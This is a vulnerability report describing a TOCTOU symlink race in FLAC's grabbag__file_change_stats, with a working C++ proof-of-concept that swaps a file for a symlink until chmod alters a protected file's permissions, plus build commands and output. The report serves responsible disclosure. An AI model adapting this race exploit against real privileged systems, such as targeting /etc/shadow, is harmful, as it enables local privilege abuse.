# Bug Report: TOCTOU Race Condition in `grabbag__file_change_stats`

Hi team, while testing the framework recently, I came across a minor bug regarding a TOCTOU race condition in `grabbag__file_change_stats` (observed on commit `9547dbc`).

---

## Root Cause

The function calls `stat(filename)` at line 100 and `chmod(filename)` at line 116 using the same pathname string, with no file descriptor held between the two syscalls. An attacker who controls the parent directory of the target file can replace it with a symlink in the brief window between these two calls. This causes `chmod()` to silently operate on the symlink target instead of the intended file.

This vulnerable function is currently called in two production paths:

- `src/share/grabbag/file.c:176` — `grabbag__file_remove_tempfile()` *(called during encode/decode)*
- `src/share/grabbag/replaygain.c:484` — ReplayGain tag write path

When `flac` or `metaflac` runs with elevated privileges (e.g., as root, via `sudo`, or as part of a package post-install hook), this race condition allows a local attacker to change permissions on arbitrary files owned by the elevated user, including critical system files like `/etc/shadow`.

---

## Proof of Concept (PoC)

To demonstrate this vulnerability, the following C++ program uses a background thread to rapidly swap a target file (`/tmp/poc.flac`) with a symlink to a strictly protected file (`/tmp/poc_secret.txt`). Concurrently, the main thread repeatedly invokes the vulnerable `grabbag__file_change_stats` function. A successful race condition results in the permissions of the protected secret file being modified.

### `poc.cpp`

```cpp
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
extern "C" {
#include "share/grabbag/file.h"
}

static const char *TARGET = "/tmp/poc.flac";
static const char *SECRET = "/tmp/poc_secret.txt";

static void *swap_loop(void *) {
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, nullptr);
    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, nullptr);
    for (;;) {
        unlink(TARGET);
        symlink(SECRET, TARGET);
        usleep(1);
        unlink(TARGET);
        close(open(TARGET, O_CREAT | O_WRONLY, 0444));
    }
    return nullptr;
}

int main() {
    FILE *f = fopen(SECRET, "w");
    fputs("sensitive content\n", f);
    fclose(f);
    chmod(SECRET, 0000);
    close(open(TARGET, O_CREAT | O_WRONLY, 0444));

    struct stat s;
    stat(SECRET, &s);
    printf("secret before: %03o\n", (unsigned)(s.st_mode & 0777));

    pthread_t tid;
    pthread_create(&tid, nullptr, swap_loop, nullptr);

    for (int i = 0; i < 5000; i++) {
        grabbag__file_change_stats(TARGET, /*read_only=*/false);
        stat(SECRET, &s);
        if (s.st_mode & 0222) {
            pthread_cancel(tid);
            pthread_join(tid, nullptr);
            printf("secret after:  %03o  [RACE WIN on attempt %d]\n",
                   (unsigned)(s.st_mode & 0777), i + 1);
            return 0;
        }
        chmod(SECRET, 0000);
    }

    pthread_cancel(tid);
    pthread_join(tid, nullptr);
    puts("race not won — try again");
    return 1;
}
```

### Compilation & Execution

```bash
$ clang++ -fsanitize=thread -g -O1 \
  -o /tmp/poc_test poc.cpp src/share/grabbag/file.c \
  -I include -I src/share -I src \
  build/src/libFLAC/libFLAC.a -lpthread -lm && /tmp/poc_test
```

**Output:**
```
clang++: warning: treating 'c' input as 'c++' when in C++ mode, this behavior is deprecated [-Wdeprecated]
secret before: 000
secret after:  200  [RACE WIN on attempt 7]
```

---

## Credit

**VulnHunterX** — Bug verification framework